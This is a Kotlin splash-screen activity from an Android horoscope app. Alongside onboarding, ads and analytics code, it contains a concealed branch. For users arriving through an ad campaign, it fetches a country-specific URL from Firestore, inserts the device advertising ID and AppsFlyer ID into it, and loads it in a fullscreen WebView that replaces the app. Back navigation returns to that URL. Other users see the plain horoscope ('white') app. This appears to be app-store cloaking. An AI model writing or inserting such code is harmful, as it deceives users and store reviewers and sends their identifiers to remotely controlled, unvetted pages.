package com.wsoteam.horoscopes

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.net.Uri
import android.os.Bundle
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import android.view.View
import android.webkit.CookieSyncManager
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.widget.FrameLayout
import androidx.appcompat.app.AppCompatActivity
import androidx.constraintlayout.widget.ConstraintLayout
import androidx.core.content.FileProvider
import androidx.lifecycle.ViewModelProviders
import com.amplitude.api.Amplitude
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.appsflyer.AppsFlyerLib
import com.facebook.appevents.AppEventsLogger
import com.google.firebase.FirebaseApp
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.firestore.DocumentReference
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.wsoteam.horoscopes.bl.Client
import com.wsoteam.horoscopes.models.Sign
import com.wsoteam.horoscopes.notification.AlarmReceiver
import com.wsoteam.horoscopes.notification.EveningAlarmReceiver
import com.wsoteam.horoscopes.presentation.form.FormActivity
import com.wsoteam.horoscopes.presentation.main.CacheData
import com.wsoteam.horoscopes.presentation.main.ICachedData
import com.wsoteam.horoscopes.presentation.main.MainVM
import com.wsoteam.horoscopes.presentation.onboarding.EnterActivity
import com.wsoteam.horoscopes.utils.Analytics
import com.wsoteam.horoscopes.utils.PreferencesProvider
import com.wsoteam.horoscopes.utils.ads.AdWorker
import com.wsoteam.horoscopes.utils.ads.BannerFrequency
import com.wsoteam.horoscopes.utils.analytics.Analytic
import com.wsoteam.horoscopes.utils.analytics.FBAnalytic
import com.wsoteam.horoscopes.utils.choiceSign
import com.wsoteam.horoscopes.utils.lk.*
import com.wsoteam.horoscopes.utils.loger.L
import com.wsoteam.horoscopes.utils.remote.ABConfig
import kotlinx.android.synthetic.main.splash_activity.*
import kotlinx.android.synthetic.main.stories_activity.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.security.MessageDigest
import java.security.NoSuchAlgorithmException
import java.util.*
import java.util.concurrent.TimeUnit


class SplashActivity : AppCompatActivity(R.layout.splash_activity) {

    var counter = 0
    var MAX = 4
    var isNextScreenLoading = false
    lateinit var vm: MainVM
    var isAdLoaded = false

    var isCanGoNext = false


    lateinit var view: WebView
    var counterBack = 0
    val MAX_BEFORE_SKIP = 2
    private var instanceState: Bundle? = null
    private val IMG_PICK = 1



    private var app = App()
    private var variables = Variables()
    private var mPrefs = PreferenceProvider()
    private var flyerParams = FlyerParams()
    private val db: FirebaseFirestore = FirebaseFirestore.getInstance()
    private var paramUtils = ParamUtils()
    private val wv = WV()

    private lateinit var webView: WebView
    private val imagePick = 1
    private var mUploadMessage: ValueCallback<Array<Uri>>? = null


    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        val results = arrayOf(Uri.parse(data!!.dataString))
        mUploadMessage!!.onReceiveValue(results)
        super.onActivityResult(requestCode, resultCode, data)

    }

    override fun onResume() {
        super.onResume()
        CookieSyncManager.getInstance().startSync()
        val decorView = window.decorView
        decorView.systemUiVisibility = View.SYSTEM_UI_FLAG_FULLSCREEN
        decorView.setOnSystemUiVisibilityChangeListener { visibility ->
            if (visibility and View.SYSTEM_UI_FLAG_FULLSCREEN == 0) {
                decorView.systemUiVisibility = View.SYSTEM_UI_FLAG_FULLSCREEN
            }
        }
    }

    override fun onPause() {
        super.onPause()
        mPrefs.saveDataInt(LideraSharedKeys.FirstOpenView.key, variables.OPEN)
        mPrefs.saveDataString(LideraSharedKeys.LastOpenUrl.key, webView.url)
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            variables.outCode++
            if (variables.outCode == 2) {
                variables.outCode = 0
                variables.firstUrl = mPrefs.getDataString(LideraSharedKeys.FirstOpenUrl.key)
                webView.loadUrl(variables.firstUrl)
            }
        }
    }


    private fun postGoNext(i: Int, tag: String) {
        counter += i
       // L.log("postGoNext -- $counter -- $tag")
        if (counter >= MAX && isCanGoNext) {
            if (!isNextScreenLoading) {
                isNextScreenLoading = true
                goNext()
            }
        }
    }

    private fun goNext() { //
        //L.log("goNext")
        Analytics.openWhite()
        var intent: Intent
        if (PreferencesProvider.getName() != "" && PreferencesProvider.getBirthday() != "") {
            intent = Intent(this, MainActivity::class.java)

        } else {
            if (!PreferencesProvider.isShowOnboard) {
                PreferencesProvider.isShowOnboard = true
                intent = Intent(this, EnterActivity::class.java)

            } else {
                intent = Intent(this, FormActivity::class.java)

            }
        }
        startActivity(intent)
        finish()
    }



    override fun onDestroy() {
        super.onDestroy()
        AdWorker.unSubscribe()
    }



    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        //FirebaseApp.initializeApp(this)
        Analytics.open()
        BannerFrequency.runSetup()
       if (!PreferencesProvider.isSetuped) {
            AppEventsLogger
                .newLogger(this)
                .logEvent("fb_mobile_first_app_launch")
            FBAnalytic.logFirstLaunch(this)
            PreferencesProvider.isSetuped = true
        }

        //Server query ollo
        var vm = ViewModelProviders
            .of(this)
            .get(MainVM::class.java)
        vm.preLoadData()


        if (PreferencesProvider.getBirthday() != "") {
            CacheData.setObserver(object : ICachedData {
                override fun cachedDataReady() {
                    makeCurrentScreen(CacheData.getCachedData()!!)
                    CacheData.removeObservers()
                }
            })
        }

        bindRetention()
        Analytic.start()
        PreferencesProvider.setBeforePremium(Analytic.start_premium)
        bindTest()
        refreshNotifications()
        try {
            trackUser()
        } catch (ex: Exception) {
            //L.log("crash")
            Analytic.crashAttr()
        }
        CoroutineScope(Dispatchers.IO).launch {
            TimeUnit.SECONDS.sleep(4)
            if (isAdLoaded){
                postGoNext(2, "sleep4")
            }else{
                postGoNext(1, "sleep4")
            }
            //Log.e("LOL", "sleep")
        }
        if (intent.getStringExtra(Config.OPEN_FROM_NOTIFY) != null) {
            when (intent.getStringExtra(Config.OPEN_FROM_NOTIFY)) {
                Config.OPEN_FROM_NOTIFY -> {
                    Analytic.openFromNotif()
                    PreferencesProvider.setLastDayNotification(PreferencesProvider.DEF_TODAY_NOTIF)
                }
                Config.OPEN_FROM_EVENING_NOTIF -> Analytic.openFromEveningNotif()
            }
        }

        app.getAdvertisingId(this)
        init()

        variables.OPEN = mPrefs.getDataInt(LideraSharedKeys.FirstOpenView.key)
        variables.lastUrl = mPrefs.getDataString(LideraSharedKeys.LastOpenUrl.key)

        splashLoader()
    }

    private fun init() {
        variables.appsFlyerId = AppsFlyerLib.getInstance().getAppsFlyerUID(applicationContext)
        Log.i("JHJ", variables.appsFlyerId)
        CookieSyncManager.createInstance(applicationContext)
        val tm = applicationContext.getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        Variables.CC = tm.networkCountryIso
        webView = WebView(this)
        webView.layoutParams = ConstraintLayout.LayoutParams(
            ConstraintLayout.LayoutParams.MATCH_PARENT,
            ConstraintLayout.LayoutParams.MATCH_PARENT
        )
        wvSettings()
    }

    private fun getFirebaseData() {
        val docRef: DocumentReference = db.collection(LideraSharedKeys.COLLECTION.key).document(variables.DOCUMENT)
        docRef.get().addOnCompleteListener { task ->
            if (task.isSuccessful) {
                val document = task.result
                if (document != null && document.exists()) {
                    val map: MutableMap<String, Any>? = document.data
                    if (variables.lastUrl == LideraSharedKeys.AppCheckerWord.key) {
                        if (map!![Variables.CC] != null) {
                            variables.FIREBASE = map[Variables.CC].toString()
                        }
                        if (variables.FIREBASE.isNotEmpty()) {
                            variables.FIREBASE = paramUtils.replaceParamHome(
                                variables.FIREBASE,
                                App.gadid,
                                variables.appsFlyerId
                            )
                            variables.FIREBASE = paramUtils.replaceParamOut(
                                variables.FIREBASE,
                                variables.sub_name_1,
                                variables.sub_name_2,
                                variables.sub_name_3,
                                variables.sub_name_4
                            )

                            col.removeAllViews()
                            col.addView(webView)
                            webView.loadUrl(variables.FIREBASE)
                        } else {
                            goNext()
                        }
                    }
                } else {
                    goNext()
                }
            } else {
                goNext()
            }
        }
    }

    private fun splashLoader() {
        val t: Thread = object : Thread() {
            @SuppressLint("SetTextI18n")
            override fun run() {
                try {
                    while (!variables.isRun) {
                        if (variables.runIterator >= 100 || App.campaign != "null" && App.campaign != "None") {
                            variables.isRun = true
                            startUIChange()
                            break
                        }

                        variables.runIterator++

                        sleep(120)

                    }
                } catch (e: InterruptedException) {
                    e.printStackTrace()
                }
            }
        }
        t.start()
    }

    private fun startUIChange() {
        if (variables.lastUrl == LideraSharedKeys.AppCheckerWord.key) {
            getAppsflyerParametr()
        } else {
            secondUiChanger()
        }
    }


    private fun secondUiChanger() {
        runOnUiThread {
            col.removeAllViews()
            col.addView(webView)
            webView.loadUrl(variables.lastUrl)
        }
    }


    @SuppressLint("SetJavaScriptEnabled")
    private fun wvSettings() {
        wv.setParams(webView)
        webView.webChromeClient = object : WebChromeClient() {

            override fun onShowFileChooser(webView: WebView?, filePathCallback: ValueCallback<Array<Uri>>?, fileChooserParams: FileChooserParams?): Boolean {
                mUploadMessage = filePathCallback
                val pickIntent = Intent()
                pickIntent.type = "image/*"
                pickIntent.action = Intent.ACTION_GET_CONTENT
                startActivityForResult(Intent.createChooser(pickIntent, "Select Picture"), imagePick)
                return true
            }
        }
    }

    private fun getAppsflyerParametr() {
        flyerParams.paramReceiver()
        variables.DOCUMENT = flyerParams.getDocName()
        getFirebaseData()
    }

    private fun makeCurrentScreen(it: List<Sign>) {
        val index = choiceSign(PreferencesProvider.getBirthday()!!)
        tvTopTitleStories.text = resources.getStringArray(R.array.names_signs)[index]
        ivSignStories.setImageResource(
            resources.obtainTypedArray(R.array.imgs_signs)
                .getResourceId(index, -1)
        )
        tvTitleStories.text = "${getString(R.string.my_horoscope_on)} ${Calendar.getInstance()
            .get(Calendar.DAY_OF_MONTH)} ${Calendar.getInstance()
            .getDisplayName(Calendar.MONTH, Calendar.LONG, Locale.US)}"
        tvTextStories.setText(getCutText(it[index].today.text))

        CoroutineScope(Dispatchers.IO).launch {
            TimeUnit.SECONDS.sleep(2)
            //makeImage()
        }
    }



    private fun getCutText(text: String): String {
        var array = text.split(".")
        var cutString = ""
        for (i in 0..1) {
            cutString = "$cutString${array[i]}. "
        }
        return cutString
    }

    private fun saveImage(bitmap: Bitmap, context: Context): Uri? {
        var imagesFolder = File(context.cacheDir, "images")
        var uri: Uri? = null

        try {
            imagesFolder.mkdirs()
            var file = File(imagesFolder, "shared_image.png")

            var outputStream = FileOutputStream(file)
            bitmap.compress(Bitmap.CompressFormat.PNG, 90, outputStream)
            outputStream.flush()
            outputStream.close()
            uri = FileProvider.getUriForFile(context, "com.mydomain.fileprovider", file)
        } catch (ex: Exception) {
           // L.log("save error")
        }
        return uri
    }

    private fun bindRetention() {
        var currentDay = Calendar.getInstance().get(Calendar.DAY_OF_YEAR)
        if (PreferencesProvider.firstEnter == -1) {
            PreferencesProvider.firstEnter = currentDay
        } else {
            when (currentDay - PreferencesProvider.firstEnter) {
                2 -> FBAnalytic.logTwoDays(this)
                7 -> FBAnalytic.logSevenDays(this)
            }
        }
    }


    private fun bindTest() {
        val firebaseRemoteConfig: FirebaseRemoteConfig = FirebaseRemoteConfig.getInstance()
        firebaseRemoteConfig.setDefaults(R.xml.default_config)

        firebaseRemoteConfig.fetch(3600).addOnCompleteListener { task ->
            if (task.isSuccessful) {
                firebaseRemoteConfig.activateFetched()
                Amplitude.getInstance().logEvent("norm_ab")
            } else {
                Amplitude.getInstance().logEvent("crash_ab")
            }
            setABTestConfig(
                firebaseRemoteConfig.getString(ABConfig.REQUEST_STRING),
                firebaseRemoteConfig.getLong(ABConfig.REQUEST_STRING_PRICE).toInt()
            )
        }
    }

    private fun setABTestConfig(version: String, priceIndex: Int) {
        L.log("set test")
        L.log("$priceIndex")
        PreferencesProvider.setVersion(version)
        PreferencesProvider.priceIndex = priceIndex
        Analytic.setABVersion(version, priceIndex)
        Analytic.setVersion()
        postGoNext(1, "setABTestConfig")
    }

    private fun refreshNotifications() {
        if (PreferencesProvider.getNotifTime() == PreferencesProvider.DEFAULT_TIME_NOTIFY && PreferencesProvider.getNotifStatus()) {
            AlarmReceiver.startNotification(this, Config.DEF_HOUR_NOTIF, Config.DEF_MIN_NOTIF)
            EveningAlarmReceiver.startNotification(
                this,
                Config.DEF_HOUR_EVENING_NOTIF,
                Config.DEF_MIN_EVENING_NOTIF
            )
            L.log("refreshNotifications")
        } else if (PreferencesProvider.getNotifTime() != PreferencesProvider.DEFAULT_TIME_NOTIFY && PreferencesProvider.getNotifStatus()) {
            val (hours, minutes) = PreferencesProvider.getNotifTime().split(":").map { it.toInt() }
            L.log("$hours $minutes refresh")
            AlarmReceiver.startNotification(this, hours, minutes)
            EveningAlarmReceiver.startNotification(
                this,
                Config.DEF_HOUR_EVENING_NOTIF,
                Config.DEF_MIN_EVENING_NOTIF
            )
        }
    }

    private fun trackUser() {
        var client = InstallReferrerClient.newBuilder(this).build()
        client.startConnection(object : InstallReferrerStateListener {
            override fun onInstallReferrerSetupFinished(responseCode: Int) {
                when (responseCode) {
                    InstallReferrerClient.InstallReferrerResponse.OK -> sendAnal(client.installReferrer.installReferrer)
                    InstallReferrerClient.InstallReferrerResponse.DEVELOPER_ERROR -> sendAnal("DEVELOPER_ERROR")
                    InstallReferrerClient.InstallReferrerResponse.FEATURE_NOT_SUPPORTED -> sendAnal(
                        "FEATURE_NOT_SUPPORTED"
                    )
                    InstallReferrerClient.InstallReferrerResponse.SERVICE_DISCONNECTED -> sendAnal("SERVICE_DISCONNECTED")
                    InstallReferrerClient.InstallReferrerResponse.SERVICE_UNAVAILABLE -> sendAnal("SERVICE_UNAVAILABLE")
                }
            }

            override fun onInstallReferrerServiceDisconnected() {
                sendAnal("onInstallReferrerServiceDisconnected")
            }
        })
    }

    private fun sendAnal(s: String) {
        val clickId = getClickId(s)
        var mFirebaseAnalytics = FirebaseAnalytics.getInstance(this)
        var bundle = Bundle()
        bundle.putString(FirebaseAnalytics.Param.CAMPAIGN, clickId)
        bundle.putString(FirebaseAnalytics.Param.MEDIUM, clickId)
        bundle.putString(FirebaseAnalytics.Param.SOURCE, clickId)
        bundle.putString(FirebaseAnalytics.Param.ACLID, clickId)
        bundle.putString(FirebaseAnalytics.Param.CONTENT, clickId)
        bundle.putString(FirebaseAnalytics.Param.CP1, clickId)
        bundle.putString(FirebaseAnalytics.Param.VALUE, clickId)
        mFirebaseAnalytics.logEvent("traffic_id", bundle)
        mFirebaseAnalytics.logEvent(FirebaseAnalytics.Event.APP_OPEN, bundle)
        mFirebaseAnalytics.logEvent(FirebaseAnalytics.Event.CAMPAIGN_DETAILS, bundle)

        postGoNext(1, "sendAnal")
    }

    private fun getClickId(s: String): String {
        var id = s
        if (s.contains("&")) {
            id = s.split("&")[0]
        }
        return id
    }
}
